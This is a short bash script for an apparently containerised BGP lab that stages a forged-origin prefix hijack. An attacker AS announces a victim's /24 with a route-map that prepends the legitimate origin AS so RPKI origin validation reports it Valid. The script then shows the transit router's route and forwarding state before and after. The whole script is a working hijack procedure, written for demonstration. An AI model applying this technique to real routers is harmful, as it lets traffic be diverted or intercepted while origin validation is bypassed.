#!/usr/bin/env bash
# Forged-origin hijack: attacker (AS65666) announces the victim's exact prefix
# 203.0.113.0/24 but forges the AS_PATH so AS65010 appears as the origin,
# fooling RPKI origin validation into marking it Valid.
set -eu
P=clab-bgp-lab
r(){ docker exec "$1" vtysh "${@:2}"; }

echo "### BEFORE — transit view of 203.0.113.0/24"
r ${P}-transit -c "show ip bgp 203.0.113.0/24" | grep -E "6501|6566|Valid|Invalid|rpki|best" || true

echo "### SETUP — attacker stages the /24 and a forging route-map"
r ${P}-attacker -c "conf t" \
  -c "interface lo" -c "ip address 203.0.113.254/24" -c "exit" \
  -c "ip prefix-list PL-FORGE seq 5 permit 203.0.113.0/24" \
  -c "route-map RM-FORGE-OUT permit 10" \
  -c "match ip address prefix-list PL-FORGE" \
  -c "set as-path prepend 65010" \
  -c "route-map RM-FORGE-OUT permit 20" \
  -c "end"

echo "### INJECT — announce forged /24 toward transit with route-map out"
r ${P}-attacker -c "conf t" -c "router bgp 65666" \
  -c "address-family ipv4 unicast" \
  -c "network 203.0.113.0/24" \
  -c "neighbor 10.0.3.1 route-map RM-FORGE-OUT out" \
  -c "end"
sleep 3

echo "### AFTER — transit view: AS_PATH and RPKI state of the forged /24"
r ${P}-transit -c "show ip bgp 203.0.113.0/24"
echo "### AFTER — transit FIB for 203.0.113.1"
r ${P}-transit -c "show ip route 203.0.113.1" | grep -E "via|entry"
